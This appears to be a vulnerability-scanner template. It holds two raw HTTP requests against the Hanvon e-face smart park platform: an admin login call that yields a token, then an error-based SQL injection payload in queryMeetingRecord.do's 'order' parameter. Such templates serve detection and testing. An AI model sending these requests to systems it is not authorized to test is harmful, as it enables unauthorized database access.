id: poc-yaml-hw-e-face-pass-spmp-querymeetingrecord-sqli
info:
  name: 汉王e脸通智慧园区管理平台 queryMeetingRecord.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    汉王e脸通智慧园区管理平台 queryMeetingRecord.do endpoint is vulnerable to SQL injection.
variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{md5(t1)}}'
http:
  - raw:
      - |
        POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: token
        internal: true
        regex:
          - '"token":"(.*?)"'

  - raw:
      - |
        GET /manage/mobiMeetingApp/queryMeetingRecord.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&recordId=1&order=(UPDATEXML(2920,CONCAT(0x7e,md5({{t1}}),0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
        Host: {{Hostname}}
        Token: {{token}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "code"
          - "hanvon"
          - "XPATH syntax error"
          - "java.sql.SQLException"
          - "{{substr(t2, 0, 31)}}"
